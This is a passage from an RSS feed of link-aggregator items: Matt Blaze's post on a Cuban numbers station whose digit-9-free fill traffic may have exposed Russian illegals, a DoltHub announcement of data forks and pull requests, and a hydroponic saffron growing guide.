September 18, 2020 | https://www.mattblaze.org/blog/neinnines/ | <a href="https://web.archive.org/web/*/https://www.mattblaze.org/blog/neinnines/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="center"><div>
		<p>18 September 2020</p><p>A Cryptologic Mystery</p>
	<p>Did a broken random number generator in Cuba help expose a Russian espionage network?</p>




	
<p>
I picked up the new book <em>Compromised</em> last week and was intrigued to discover that it may have shed some light on a small (and rather esoteric) cryptologic and espionage mystery that I've been puzzling over for about 15 years. <em>Compromised</em> is primarily a memoir of former FBI counterintelligence agent Peter Strzok's investigation into Russian operations in the lead up to the 2016 presidential election, but this post is not a review of the book or concerned with that aspect of it.
</p><p>
Early in the book, as an almost throwaway bit of background color, Strzok discusses his work in Boston investigating the famous Russian "illegals" espionage network from 2000 until their arrest (and subsequent exchange with Russia) in 2010. "Illegals" are foreign agents operating abroad under false identities and without official or diplomatic cover. In this case, ten Russian illegals were living and working in the US under false Canadian and American identities. (The case inspired the recent TV series <em>The Americans</em>.)
</p><p>
Strzok was the case agent responsible for two of the suspects, Andrey Bezrukov and Elena Vavilova (posing as a Canadian couple under the aliases Donald Heathfield and Tracey Lee Ann Foley). The author recounts watching from the street on Thursday evenings as Vavilova received encrypted shortwave "numbers" transmissions in their Cambridge, MA apartment.
</p><p>
Given that Bezrukov and Vaviloa were indeed, as the FBI suspected, Russian spies, it's not surprising that they were sent messages from headquarters using this method; numbers stations are part of time-honored espionage tradecraft for communicating with covert agents. But their capture may have illustrated how subtle errors can cause these systems to fail badly in practice, even when the cryptography itself is sound.
<br>
<a name="fold">&nbsp;</a></p><hr size="1"><p>
	

First, a bit of background. For at least the last sixty years, encrypted shortwave radio transmissions have been a standard method for sending messages to covert spies abroad. Shortwave radio has several attractive properties here. It covers long distances; it's possible for a single transmitter to get hemispheric or even global coverage. Shortwave radio receivers, while less common than they once were, are readily available commercially in almost every country and are not usually suspicious or alerting to possess. And while it's relatively easy to tell where a shortwave signal is coming from, their wide coverage area makes it very difficult to infer exactly who or where the intended recipients might be. Both the US (and its allies) and the Soviet Union (and its satellites) made extensive use of shortwave radio for communicating with spies during the cold war, and enigmatic "numbers" transmissions aimed at spies continue to this day.
</p><p>
The encryption method of choice used by numbers stations is called a "one time pad" (OTP) cipher. OTPs have unique advantages over other encryption methods. Used properly, they are <em>unconditionally</em> secure; no amount of computing power or ingenuity can "break" them without knowledge of the secret key. Also, they are almost deceptively low tech. It is possible to encrypt and decrypt OTP messages by hand with nothing more than paper and pencil and simple arithmetic. The disadvantage is that OTPs are cumbersome; you need a secret key as long as all the messages you will ever send, with no part of the key ever re-used for multiple messages. Typically, the key would be printed as a series of digits bound into a pad of paper, with each page removed after use; hence the name "one time pad". OTPs can be difficult in practice to use properly and are quite vulnerable if used improperly; more on that later.
</p><p>
The OTP messages sent to spies by shortwave radio typically consist of decimal digits broadcast in either a mechanically recorded voice or in morse code (more recently, digital transmissions are also used) on designated frequencies at designated times, usually in four or five digit groups (hence the term "numbers station"). After copying and verifying a header in the message, the agent would remove the corresponding page from their secret OTP codebook and add each key digit to each corresponding message digit using modulo-10 arithmetic (without carry). The resulting "plaintext" digits are then converted to text with a simple substitution encoding (e.g, A=01, B=02, etc., although other encodings are generally used). That's all there is to it. The security of the system depends entirely on the uniqueness and secrecy of the OTP codebook pad given to each agent.
</p><p>
To prevent "traffic analysis" that might reveal to an observer the number of active agents or the volume of messages sent to them, numbers stations typically operate on rigidly fixed schedules, sending messages at pre-determined times whether there is actually a message to be sent or not. When there is no traffic for a given timeslot, random dummy "fill" traffic is sent instead. The fill traffic should be indistinguishable to an outsider from real messages, thereby leaking nothing about how often or when the true messages are being sent. But more on this later.
</p><p>
None of this is by itself news. The existence of numbers stations has been publicly known (and tracked by hobbyists) since at least the 1960's, and OTPs are an elementary cryptographic technique known to every cryptographer. However, Strzok mentions two interesting details I'd not seen published previously and that may solve a mystery about one of the most well known numbers stations heard in North America.
</p><p>
First, <em>Compromised</em> reveals that the FBI found that during at least some of the time the illegals were under investigation, the Russian numbers intended for them were sent not by a transmitter in Russia (which might have difficulty being reliably received in the US), but relayed by the <em>Cuban</em> shortwave numbers station. This is perhaps a bit surprising, since the period in question (2000-2010) was well after the Soviet Union, the historic protector of Cuba's government, had ceased to exist.
</p><p>
The Cuban numbers station is somewhat legendary. It is a powerful station, operated by Cuba's intelligence directorate but co-located with Radio Habana's transmitters near Bauta, Cuba, and is easily received with even very modest equipment throughout the US. While its numbers transmissions have taken a variety of forms over the years, during the early 2000's it operated around the clock, transmitting in both voice and morse code. The station was (and remains) so powerful and widely heard that radio hobbyists quickly derived its hourly schedule. During this period, each scheduled hourly transmission consisted of a preamble followed by three messages, each made up entirely of a series of five digit groups (with by a brief period of silence separating the three messages). The three hourly messages would take a total of about 45 minutes, in either voice or morse code depending on the scheduled time and frequency. Every hour, the same thing, predictably right on schedule (with fill traffic presumably substituted for the slots during which there was no actual message).
</p><p>
If you want to hear what this sounded like, here's a recording I made on October 4, 2008 of one of the hourly voice transmissions, as received (static and all) in my Philadelphia apartment: <a target="_blank" href="https://www.mattblaze.org/private/17435khz-200810041700.mp3"><tt>www.mattblaze.org/private/17435khz-200810041700.mp3</tt></a>. The transmission follows the standard Cuban numbers format of the time, starting with an "Atenƒáion" preamble listing three five-digit identifiers for the three messages that follow, and ending with "Final, Final". In this recording, the first of the three messages (64202) starts at 3:00, the second (65852) at 16:00, and the third (86321) at 29:00, with the "Final" signoff at the end. The transmissions are, to my cryptographic ear at least, both profoundly dull and yet also eerily riveting. 
</p><p>
And this is where the mystery I've been wondering about comes in. In 2007, I noticed an odd anomaly: some messages completely lacked the digit 9 ("nueve"). Most messages had, as they always did and as you'd expect with OTP ciphertext, a uniform distribution of the digits 0-9. But other messages, at random times, suddenly had no 9s at all. I wasn't the only (or the first) person to notice this; apparently the 9s started disappearing from messages some time around 2005.
</p><p>
This is, to say the least, very odd. The way OTPs work should produce a uniform distribution of all ten digits in the ciphertext. The odds of an entire message lacking 9s (or any other digit) are infinitesimal. And yet such messages were plainly being transmitted, and fairly often at that. In fact, in the recording of the 2008 transmission linked to above, you will notice that while the second and third messages use all ten digits, the first is completely devoid of 9s.
</p><p>
I remember concluding that the most likely, if still rather improbable, explanation was that the 9-less messages were dummy fill traffic and that the random number generator used to create the messages had a bug or developed a defect that prevented 9s from being included. This would be, to say the least, a very serious error, since it would allow a listener to easily distinguish fill traffic from real traffic, completely negating the benefit of having fill traffic in the first place. It would open the door to exactly the kind of traffic analysis that the system was carefully engineered to thwart. The 9-less messages went on for almost ten years. (If I were reporting this as an Internet vulnerability, I would dub it the "Nein Nines" attack; please forgive the linguistic muddle). But I was resigned to the likelihood that I would never know for sure.
</p><p>
And this brings us to the second observation from Strzok's book.
</p><p>
<em>Compromised</em> doesn't say anything about missing nueves, but he does mention that the FBI exploited a serious tradecraft error on the part of the sender: the FBI was able ‚Ä¶</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.mattblaze.org/blog/neinnines/">https://www.mattblaze.org/blog/neinnines/</a></em></p>]]>
            </description>
            <link>https://www.mattblaze.org/blog/neinnines/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24521801</guid>
            <pubDate>Fri, 18 Sep 2020 20:55:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Dolt releases forks to become a real open data collaboration platform]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24521536">thread link</a>) | @bheni
<br/>
September 18, 2020 | https://www.dolthub.com/blog/2020-09-18-introducing-forks/ | <a href="https://web.archive.org/web/*/https://www.dolthub.com/blog/2020-09-18-introducing-forks/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-cy="blog-post-text"><p>Today, <a href="https://dolthub.com/">DoltHub</a> released forks. It is the same system that Github uses for collaboration on over
100 million repositories contributed to by their 40+ million users.  For the first time there is a general platform
for data collaboration, and we hope it moves open data to the next level.</p>

<p>When we started this company in August 2018 something that excited us was expanding the types of businesses that you
could start, and succeed at.  In many of the spaces today, it is difficult to come in and compete with the large players
simply because they have huge amounts of data that isn't available publicly.</p>
<p>As an example, Google launched "Google Maps" in 2005 and has heavily invested in that space since then.  It had offered
an API freely until 2012 when it began charging.  If you want to come in and compete with Google Maps you will need data
that is at least as good or better than Google's.  You can pay Google for access to their data, but at that point
you are paying to make their data better, and the gap between the data that you have, and the data that they have widens.  You
could spend the money to acquire that data, but the cost of acquiring it is beyond the budget of any startup.
So the only way to compete is with the help of others. <a href="https://www.openstreetmap.org/#map=5/38.007/-95.844">Open Street Maps</a>
is an open data project with hundreds of contributors which is being used and contributed to by companies such as Apple, Faceebook,
Foursquare, Mapbox, MapQuest, Tesla, Wikipedia and Snapchat.</p>
<p>Projects such as <a href="https://wikipedia.com/">Wikipedia</a>, other <a href="https://wikimedia.org/">Wikimedia projects</a>, and
<a href="https://www.openstreetmap.org/#map=5/38.007/-95.844">Open Street Maps</a> have shown the power of community collaboration
on data. However, there hasn't ever been a platform that made collaborating on data feasible.</p>

<p>As obvious as the benefits of data collaboration are, there are very few successful collaborative data projects.  The ones
that have been successful created platforms for getting data mainlined using specialized processes for
editing, merging, and handling conflicts that are specific to their data. </p>
<p>Though not a data product, I'll also be looking at how Git/Github approached these problems in order to
become the largest collaborative coding platform in the world, and how this approach can be used to provide a general
purpose collaborative data platform, and how Dolt/Dolthub extend that to data.</p>
<h2>Merging and Conflicts</h2>
<p>Any time you have multiple editors working on something together, merging and conflicts are a problem.  Whether it's
people collaboratively editing a document online, working on source code managed by some version control system, or
editing data in a database there is always the potential for two or more users to be modifying the same data.</p>
<p>There are different strategies for dealing with this employed by different systems. A simple solution is to just allow
the last write to win.  Some systems might force manual merges, while others may have complex domain-specific rules for
completely automated merges.  Git and Dolt attempt to automatically merge multiple edits into one, and force manual
resolution when item cannot be merged without conflict. Dolt takes it a step further by allowing you to analyze
the differences, and conflicts via SQL, and then lets you write SQL to resolve them.  </p>
<h2>Data Quality and Trust</h2>
<p>Any time you are working on a project that is open to the world, you will have to deal with bad actors.  <a href="https://www.calvertjournal.com/articles/show/2967/wikipedia-russian-government-edits">Some have
bad intentions</a>, others
are <a href="https://www.boredpanda.com/funny-wikipedia-edits/">just having a laugh</a>, and others may be adding incorrect
data unintentionally.</p>
<p>Different moderation strategies can be employed each with their own strengths and weaknesses.  Automated moderation systems
can detect some types of data errors quickly, but they can take a lot of work to train and tune in order to have a
good hit rate for erroneous changes. User based moderation systems give control to community members, and they are easy
and low cost to deploy, but their success is highly variable depending on the abilities of the moderators.</p>
<p>GitHub and DoltHub organize their projects into repositories, and grant users different privileges.  Users
may be given write access to the project by one of its owners.  These users are trusted by the project to maintain
data quality and may make changes to the data directly. In GitHub, untrusted users may fork the data, and submit changes
back to the main dataset via a "Pull Request". <em>As of today, you can do that on DoltHub too</em> <a href="#introducing-dolthub-forks-and-cross-fork-pull-requests">(Details below)</a>. </p>
<h2>Community Disagreement and Ownership</h2>
<p>Even when you have a good moderation system, datasets evolve, and disagreements can arise.  As an example, In 2007 Open
Street Maps had an <a href="https://en.wikipedia.org/wiki/Wikipedia:Edit_warring">"edit war"</a>
over the language that should be used for locations in Turkish controlled Northern Cypress.  Wikipedia keeps a page
dedicated to the <a href="https://en.wikipedia.org/wiki/Wikipedia:Lamest_edit_wars">lamest edit wars</a> seen on their platform. Other
types of disputes could be simple disputes over schema, or formatting.</p>
<p>GitHub, and now DoltHub handle this with forks. In the event that you do not like the direction that a project is going
you can always fork the project, and take it in your own direction, and you can still continue to integrate changes
from the project that you forked from.  Additionally, you can still send PRs to get your changes pushed back onto the
project you forked from.  You can continue to collaborate with the entire community, even after you have taken your
version of the project in another direction. One major example of a successful fork is MariaDB. In 2009 MySQL was forked
after a couple of acquisitions left concerns about MySQL as an open source project. Today MariaDB is a thriving
project, with a robust community.</p>

<p>Today <a href="https://dolthub.com/">Dolthub</a> is launching forks, and it is a leap forward for collaborative data projects. This
is the first solution for open data collaboration which addresses all these problems in a generalized way.  </p>
<h2>What is a Fork</h2>
<p>A fork is a copy of the data which you become the owner of.  You control who can modify your data, and those users determine
what data gets merged.  You can continue to pull changes from the repository that you forked from, and you can submit
pull requests (PRs) back to it.  You can use it as a tool to get your changes onto a repository, or you can use it to
take that repository in a different direction.</p>
<h2>What is a Pull Request</h2>
<p>A pull request or PR is a request sent to the contributors of a repository to merge your changes into their repository. It
will encapsulate all the changes that were made between the first common ancestor of the source of your repository, and
the destination branch of the repository you are submitting to. Owners of the pull request's destination repository can
then review and integrate these changes into their repository.</p>

<p>At the end of july I wrote <a href="https://www.dolthub.com/blog/2020-07-29-scraping-linkedin/">an article about Open Resumes</a>,
where I talked about the motivations for scraping linked in, and the desire for an
<a href="https://www.dolthub.com/repositories/Liquidata/open-resumes/">Open Resumes</a> dataset. With the arrival of forks I invite
you to fork the dataset, and send us a pull request containing your scraped LinkedIn resume.  More than anything, our goal
here is to show off Dolt/DoltHub as a data collaboration platform. </p>

<p>With today's release we feel we are a step closer to being the platform that we envisioned in 2018.  We have built the most
important features of a collaborative data platform. We will continue to develop features to this end which will improve
the experience, but the next step is to get people to start collaborating on data on the platform. We are getting ready
to put our money where our mouth is.  Stay tuned for some announcements that could make you real money collaborating on
some of our datasets.</p></div></div>]]>
            </description>
            <link>https://www.dolthub.com/blog/2020-09-18-introducing-forks/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24521536</guid>
            <pubDate>Fri, 18 Sep 2020 20:26:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Growing Saffron Hydroponically: A Guide]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24521329">thread link</a>) | @jelliclesfarm
<br/>
September 18, 2020 | https://gardeningtips.in/growing-saffron-hydroponically-from-bulbs-a-full-guide | <a href="https://web.archive.org/web/*/https://gardeningtips.in/growing-saffron-hydroponically-from-bulbs-a-full-guide">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <!-- image --><div><figure><img width="696" height="522" src="https://gardeningtips.in/wp-content/uploads/2019/07/saffron-1785080_960_720-696x522.jpg" srcset="https://gardeningtips.in/wp-content/uploads/2019/07/saffron-1785080_960_720-696x522.jpg 696w, https://gardeningtips.in/wp-content/uploads/2019/07/saffron-1785080_960_720-300x225.jpg 300w, https://gardeningtips.in/wp-content/uploads/2019/07/saffron-1785080_960_720-768x576.jpg 768w, https://gardeningtips.in/wp-content/uploads/2019/07/saffron-1785080_960_720-80x60.jpg 80w, https://gardeningtips.in/wp-content/uploads/2019/07/saffron-1785080_960_720-265x198.jpg 265w, https://gardeningtips.in/wp-content/uploads/2019/07/saffron-1785080_960_720-560x420.jpg 560w, https://gardeningtips.in/wp-content/uploads/2019/07/saffron-1785080_960_720.jpg 800w" sizes="(max-width: 696px) 100vw, 696px" alt="Growing Saffron Hydroponically." title="Growing Saffron Hydroponically." data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20696%20522'%3E%3C/svg%3E" data-lazy-srcset="https://gardeningtips.in/wp-content/uploads/2019/07/saffron-1785080_960_720-696x522.jpg 696w, https://gardeningtips.in/wp-content/uploads/2019/07/saffron-1785080_960_720-300x225.jpg 300w, https://gardeningtips.in/wp-content/uploads/2019/07/saffron-1785080_960_720-768x576.jpg 768w, https://gardeningtips.in/wp-content/uploads/2019/07/saffron-1785080_960_720-80x60.jpg 80w, https://gardeningtips.in/wp-content/uploads/2019/07/saffron-1785080_960_720-265x198.jpg 265w, https://gardeningtips.in/wp-content/uploads/2019/07/saffron-1785080_960_720-560x420.jpg 560w, https://gardeningtips.in/wp-content/uploads/2019/07/saffron-1785080_960_720.jpg 800w" data-lazy-src="https://gardeningtips.in/wp-content/uploads/2019/07/saffron-1785080_960_720-696x522.jpg"><figcaption>Growing Saffron Hydroponically.</figcaption></figure></div>
            <!-- content --><h3><span id="A_step_by_step_guide_for_growing_hydroponic_saffron"><strong><u>A step by step guide for growing hydroponic saffron</u></strong></span>
</h3>
<p>Today, we discuss the topic of growing saffron hydroponically, hydroponic saffron plant care, hydroponic saffron bulb germination, harvesting procedure of hydroponic saffron, hydroponic nutrient solution, fertilizer for the saffron plants, and suitable hydroponic <a data-ail="1844" target="_self" href="https://gardeningtips.in/nft-hydroponics-system-building-requirements">NFT</a> (Nutrient film technique), DWC (Deepwater culture) system for growing saffron.</p>
<p>Hello, dear readers today we are back again with something more interesting and valuable for you. What if I say I have the formula to make you rich that too simply by gardening at your home only! The plant today we will be discussing is no less than a treasure, I hope all you are aware of the world√¢‚Ç¨‚Ñ¢s most expensive spice!!</p>

<p>Yes, friends, we will be talking about <strong><u>how to grow saffron</u></strong> in a <a data-ail="1844" target="_self" href="https://gardeningtips.in/starting-hydroponics-gardening-at-home">hydroponics</a> system. Saffron: strands of gold a spice that costs more by weight than the gold. However, since we can√¢‚Ç¨‚Ñ¢t grow gold, saffron might be the next best thing.</p>
<h4><span id="Growing_saffron_bulbs_hydroponically"><strong><u>Growing saffron bulbs hydroponically</u></strong></span>
</h4>
<p>The saffron crocus (<em>Crocus sativus L.)</em> is propagated from a small rounded corm (very much similar to a bulb). Authentic Saffron spice comes from the stigma of the Saffron corm flower. The corm is basically the bulb from which the Saffron is grown it is a rounded tuber that gives rise to up to three flowers. The corms are purchased when they are in the dormant stage, and plant in late summer or early fall when they quickly burst into life with the production of small crocus flowers.</p>
<p>This exotic spice is the dried thread like red-gold colored stigma which is formed inside the beautiful blue/purple flower. Each flower produces on an average of three stigmas which give three strands of saffron. After flowering, the plant resumes its vegetative growth of thin, dark green strap-like leaves and then multiplies itself. It takes approximately a pound of fresh flowers to yield an ounce of stigmas. Once the stigmas are dried to produce the spice, it loses about 75 √¢‚Ç¨‚Äú 80% of its mass and considerable weight leaving you with very little spice, which is one very solid reason the price is so very expensive. Furthermore, in addition to its culinary uses, Saffron has also demanded it is pharmaceutical, cosmetic, and industrial applications.</p>

<p>You may also like <a data-mil="1844" href="https://gardeningtips.in/growing-stevia-hydroponically-from-seed-a-full-guide"><span><strong>Growing Stevia Hydroponically from Seed</strong></span></a>.</p>
<p>Saffron is a tough crop to grow and maintain but far from impossible. In fact, probably <strong><u>saffron spice grown hydroponically</u></strong> is easy to grow and maintain than it would be conventional. The bulbs or corms are the propagating material and can be easily obtained from stores for <strong><u>growing saffron indoors for profit</u></strong> as well.</p>
<p>When buying corms for the first time, it is important to know that like many flowering bulbs, the corms come in different size grades from very small (0.6 grams) which would be a non-flowering type requiring an extra season√¢‚Ç¨‚Ñ¢s growth, to very large (24 grams).</p>

<p>The smaller corms are usually less expensive, but they may not produce flowers in the first season or gives a much lower yield of saffron and a lower number of daughter corms after flowering. The top planting grade for hydroponics is around 15 grams which are generally over an inch in diameter. The corms turn up dry in a dormant state ready for planting out.</p>
<p>In an indoor Hydroponic system, they can be planted throughout the year as you are determining and manipulating their growing environment affecting <strong><u>the growth of saffron</u></strong> even this is followed in the <strong><u>hydroponic flower farm</u></strong>.</p>
<p>The corms can be planted, flowered, and harvested in approximately 45-day cycles. At the completion of each cycle, you will have to start again with new corms or wait for the existing ones to go through their vegetative and dormancy phases before re-flowering and multiplying again.</p>
<h4><span id="The_dormancy_of_saffron_plants"><strong>The dormancy of saffron plants</strong></span>
</h4>
<figure id="attachment_1846" aria-describedby="caption-attachment-1846"><img src="https://gardeningtips.in/wp-content/uploads/2019/07/violet-4032577_960_720.jpg" alt="Saffron Plants." width="800" height="531" srcset="https://gardeningtips.in/wp-content/uploads/2019/07/violet-4032577_960_720.jpg 800w, https://gardeningtips.in/wp-content/uploads/2019/07/violet-4032577_960_720-300x199.jpg 300w, https://gardeningtips.in/wp-content/uploads/2019/07/violet-4032577_960_720-768x510.jpg 768w, https://gardeningtips.in/wp-content/uploads/2019/07/violet-4032577_960_720-696x462.jpg 696w, https://gardeningtips.in/wp-content/uploads/2019/07/violet-4032577_960_720-633x420.jpg 633w" sizes="(max-width: 800px) 100vw, 800px" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20800%20531'%3E%3C/svg%3E" data-lazy-srcset="https://gardeningtips.in/wp-content/uploads/2019/07/violet-4032577_960_720.jpg 800w, https://gardeningtips.in/wp-content/uploads/2019/07/violet-4032577_960_720-300x199.jpg 300w, https://gardeningtips.in/wp-content/uploads/2019/07/violet-4032577_960_720-768x510.jpg 768w, https://gardeningtips.in/wp-content/uploads/2019/07/violet-4032577_960_720-696x462.jpg 696w, https://gardeningtips.in/wp-content/uploads/2019/07/violet-4032577_960_720-633x420.jpg 633w" data-lazy-src="https://gardeningtips.in/wp-content/uploads/2019/07/violet-4032577_960_720.jpg"><figcaption id="caption-attachment-1846">Saffron Plants.</figcaption></figure><p>The non-productive vegetative and dormancy phase takes approximately about nine months, so starting with new corms for each growth cycle is actually the most cost-effective way.</p>
<p>You may be interested in <a data-mil="1844" href="https://gardeningtips.in/growing-hydroponic-bitter-gourd-from-seed"><span><strong>Growing Hydroponic Bitter Gourd from Seed</strong></span></a>.</p>

<p>Another option is to keep several sets of corms and their daughter corms ready; while one set is in the dormant stage the others will be producing. Dormant Corms should be stored in a dry location and planted out at the appropriate time over the winter and will sprout again in the fall. After breaking the dormancy they do need to go through their vegetative stage to gain enough energy for the production of the following season√¢‚Ç¨‚Ñ¢s crop. Each healthy parent corm produces about five to ten daughter corms that can be used to give another crop in the following season.</p>
<h4><span id="Hydroponic_setup_and_nutrient_solution_for_saffron"><strong>Hydroponic setup and nutrient solution for saffron</strong></span>
</h4>
<p>For growing saffron in hydroponics system like NFT, DWC and pin trays are commonly used. Pin trays are principally temporary growing chambers where the plants√¢‚Ç¨‚Ñ¢ roots will be growing and the bulbs are anchored. These chambers provide support while the roots are developing. Loose growing media such as Perlite, vermiculite √¢‚Ç¨‚Äú <a data-ail="1844" target="_self" href="https://gardeningtips.in/hydroponics-perlite-growing-medium-advantages">perlite</a> blend, <a data-ail="1844" target="_self" href="https://gardeningtips.in/coconut-coir-benefits-for-gardening-making-uses">coco coir</a>. Oasis starter cubes are used for starting bulbs. The Media must be loose enough to allow bulb and root expansion but powerful enough to support the full-grown flowering plants.</p>
<p>Plants that grow with Bulbs or corms; grow best with lots of phosphorus and potassium for growth and flower production. Not too much nitrogen is required. Hydroponic nutrients are not strictly necessary for germination if you choose this way; the corms/seeds should be supplied with nutrients mixed at less than half strength with water.</p>


<p>You may also like<a data-mil="1844" href="https://gardeningtips.in/growing-hydroponic-broccoli-a-complete-guide"><strong><span> Growing Hydroponic Broccoli</span></strong></a>.</p>

<p>Some of the more adventurous growers like to dive into plant chemistry and formulate their own nutrient solutions, assuming you are prepared to deal with some plant losses while experimenting.</p>
<p>In the case of Saffron, the plant does not require much attention the only thing you are interested here is germination and flowering. Once the plant has flowered rest growth it is no longer of any use, the stigmas are harvested upon bloom. So the option is nutrient solution should be the one specially designed to promote flowering /blooms. √Ç&nbsp;So you can fetch bloom formulation from any store just make sure you do dilution as per the manufacturer√¢‚Ç¨‚Ñ¢s instructions. Nutrient values should be measured at regular intervals with pH and EC meters, nutrient attributes an EC of 1.4 and pH 5.5 encourage flowering.</p>
<h4><span id="The_temperature_requirement_for_growing_saffron_hydroponically"><strong>The temperature requirement for growing saffron hydroponically</strong></span>
</h4>
<p>One of the advantages of the indoor hydroponic technique is temperature can be manipulated by the grower. A range of 60 to 65 degree Fahrenheit in daytime range, with nigh-time temperature, should not be lower than 53 Fahrenheit is best for the flowering.</p>
<p>If it gets too warm the flower will experience flower drop and in too cold conditions plant will also get flower drop followed by dormancy. So indoor grow room, should be manipulated in such a way that it provides dry warmth of summer to induce growth, followed by damp and cooler conditions to induce flowering.</p>

<p>You should not miss <a data-mil="1844" href="https://gardeningtips.in/growing-bottle-gourd-hydroponically-lauki-from-seed"><strong><span>Growing Bottle Gourd Hydroponically</span></strong></a>.</p>
<h4><span id="The_light_requirement_for_saffron_growing_hydroponically"><strong>The light requirement for saffron growing hydroponically</strong></span>
</h4>
<p>Exposure of 14 to 16 hours of direct light per day is the optimal day length to induce flowering. Post-flowering the day length can be reduced to 12 √¢‚Ç¨‚Äú 14 hours a day. So make sure you install your hydroponic setup in the place where optimum light hours are met.</p>
<h4><span id="Flowering_and_harvesting_saffron_in_hydroponics"><strong>Flowering and harvesting saffron in hydroponics</strong></span>
</h4>
<p>The flowering of the corms will usually take place quite quickly after planting; within a few weeks, the first emerging flower buds can be seen. The flowers will completely open within three to five days and will be ready for harvest. As each flower blooms, it should be plucked or snipped from the plant and taken away for further processing.</p>
<p>Inside the flower there will be two or three thin dark red coloured thread like a stigma which are the economic part of the plant and forms the saffron spice when dried; there will also be three, shorter, wider, golden-colored anthers which usually bear pollen on their surface these are not element of the spice and should be discarded. The simplest way of removing the saffron stigmas from the center of the flower is to pull back and remove all the petals and then clip the red strands at the base. These will then require to be dried before storage.</p>
<figure id="attachment_1845" aria-describedby="caption-attachment-1845"><img src="https://gardeningtips.in/wp-content/uploads/2019/07/saffron-215932_960_720.jpg" alt="Dry Saffron." width="800" height="535" srcset="https://gardeningtips.in/wp-content/uploads/2019/07/saffron-215932_960_720.jpg 800w, https://gardeningtips.in/wp-content/uploads/2019/07/saffron-215932_960_720-300x201.jpg 300w, https://gardeningtips.in/wp-content/uploads/2019/07/saffron-215932_960_720-768x514.jpg 768w, https://gardeningtips.in/wp-content/uploads/2019/07/saffron-215932_960_720-696x465.jpg 696w, https://gardeningtips.in/wp-content/uploads/2019/07/saffron-215932_960_720-628x420.jpg 628w" sizes="(max-width: 800px) 100vw, 800px" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20800%20535'%3E%3C/svg%3E" data-lazy-srcset="https://gardeningtips.in/wp-content/uploads/2019/07/saffron-215932_960_720.jpg 800w, https://gardeningtips.in/wp-content/uploads/2019/07/saffron-215932_960_720-300x201.jpg 300w, https://gardeningtips.in/wp-content/uploads/2019/07/saffron-215932_960_720-768x514.jpg 768w, https://gardeningtips.in/wp-content/uploads/2019/07/saffron-215932_960_720-696x465.jpg 696w, https://gardeningtips.in/wp-content/uploads/2019/07/saffron-215932_960_720-628x420.jpg 628w" data-lazy-src="https://gardeningtips.in/wp-content/uploads/2019/07/saffron-215932_960_720.jpg"><figcaption id="caption-attachment-1845">Dry Saffron.</figcaption></figure><p>Saffron is very delicate and the strands should be placed carefully on white paper and allowed to air dry and fully desiccate. Any slight breeze can easily blow not only the strands but your efforts too. Being small and very light, the saffron dries within a week in most cases and can then be stored in airtight glass jars for better storage. A small pack of silicon desiccant can be used to make ensure that any additional moisture on the strands or air does not cause any storage problems. Inadequately dried saffron invites mold, fungi, so supplementary air-drying time is recommended if the humidity levels are high.</p>
<p>That√¢‚Ç¨‚Ñ¢s all folks about growing saffron hydroponically along with its cultivation practices without <a data-ail="1844" target="_self" href="https://gardeningtips.in/preparing-soil-for-vegetable-garden-a-full-guide">soil</a>.</p>
<p>You may also check the <a href="https://www.agrifarming.in/sweet-potato-cultivation-income-profit-project-report"><span><strong>Sweet Potato Cultivation Income, Profit, Project Report</strong></span></a>.</p>

<div>
<div data-currpage="1" id="epyt_gallery_76212"><iframe id="_ytid_61147" width="696" height="392" data-origwidth="696" data-origheight="392" src="https://www.youtube.com/embed/nqikG1ByIZQ?enablejsapi=1&amp;autoplay=0&amp;cc_load_policy=0&amp;iv_load_policy=1&amp;loop=0&amp;modestbranding=0&amp;rel=0&amp;fs=0&amp;playsinline=0&amp;autohide=2&amp;theme=dark&amp;color=red&amp;controls=1&amp;" title="YouTube player" data-epytgalleryid="epyt_gallery_76212" allow="autoplay; encrypted-media" allowfullscreen="" data-no-lazy="1" data-skipgform_ajax_framebjll=""></iframe><div><div><div tabindex="0" role="button" data-videoid="nqikG1ByIZQ"><div><div data-bg="https://i.ytimg.com/vi/nqikG1ByIZQ/hqdefault.jpg"><div><p><img alt="play" width="30" height="23" src="https://gardeningtips.in/wp-content/plugins/youtube-embed-plus/images/playhover.png" data-no-lazy="1" data-skipgform_ajax_framebjll=""></p></div></div></div><p>Terrace Gardening Guide</p></div><div tabindex="0" role="button" data-videoid="7rWkpXcrzrg"><div><div data-bg="https://i.ytimg.com/vi/7rWkpXcrzrg/hqdefault.jpg"><div><p><img alt="play" width="30" height="23" src="https://gardeningtips.in/wp-content/plugins/youtube-embed-plus/images/playhover.png" data-no-lazy="1" data-skipgform_ajax_framebjll=""></p></div></div></div><p>Growing Mushrooms Indoors</p></div><div tabindex="0" role="button" data-videoid="aIs5My0dRGI"><div><div data-bg="https://i.ytimg.com/vi/aIs5My0dRGI/hqdefault.jpg"><div><p><img alt="play" width="30" height="23" src="https://gardeningtips.in/wp-content/plugins/youtube-embed-plus/images/playhover.png" data-no-lazy="1" data-skipgform_ajax_framebjll=""></p></div></div></div><p>How To Make Compost</p></div><div tabindex="0" role="button" data-videoid="nL8pSWvQHHU"><div><div data-bg="https://i.ytimg.com/vi/nL8pSWvQHHU/hqdefault.jpg"><div><p><img alt="play" width="30" height="23" src="https://gardeningtips.in/wp-content/plugins/youtube-embed-plus/images/playhover.png" data-no-lazy="1" data-skipgform_ajax_framebjll=""></p></div></div></div><p>Growing Coriander from Seed</p></div><div tabindex="0" role="button" data-videoid="v5JeoXtqk2s"><div><div data-bg="https://i.ytimg.com/vi/v5JeoXtqk2s/hqdefault.jpg"><div><p><img alt="play" width="30" height="23" src="https://gardeningtips.in/wp-content/plugins/youtube-embed-plus/images/playhover.png" data-no-lazy="1" 